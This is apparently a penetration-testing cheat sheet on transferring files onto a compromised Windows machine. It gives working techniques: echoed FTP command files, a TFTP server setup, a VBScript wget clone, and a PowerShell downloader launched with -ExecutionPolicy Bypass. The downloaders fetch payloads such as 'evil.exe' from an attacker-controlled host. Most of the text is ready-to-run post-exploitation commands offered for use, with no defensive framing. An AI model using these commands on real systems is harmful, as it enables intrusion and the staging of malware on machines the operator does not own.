# Windows basics

## Transferring files

Why is this so much harder in Windows? I don't know.

## FTP

Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.

On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21&gt; ftp.txt echo USER username&gt;&gt; ftp.txt echo password&gt;&gt; ftp.txt echo bin&gt;&gt; ftp.txt echo GET wget.exe&gt;&gt; ftp.txt echo bye&gt;&gt; ftp.txt

Then run this command to connect to the ftp

```text
ftp -v -n -s:ftp.txt
```

## TFTP

TFTP is installed by default on Windows XP and Windows 2003. Kali also has a TFTP server:

```text
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```

With this command you can serve files from `/srv/tftp`.

From a Windows machine, use this to transfer files:

```text
tftp -i [host] GET wget.exe
```

### VBScript

Here is a good script to make a wget-clone in VB \(may need to be piped through unix2dos before copying it\):

```text
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

To execute:

```text
cscript wget.vbs http://[hoste]/evil.exe evil.exe
```

### Powershell

Powershell can't be started in a non-interactive shell. But this script can start it:

```text
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://[host]/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

To execute:

```text
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

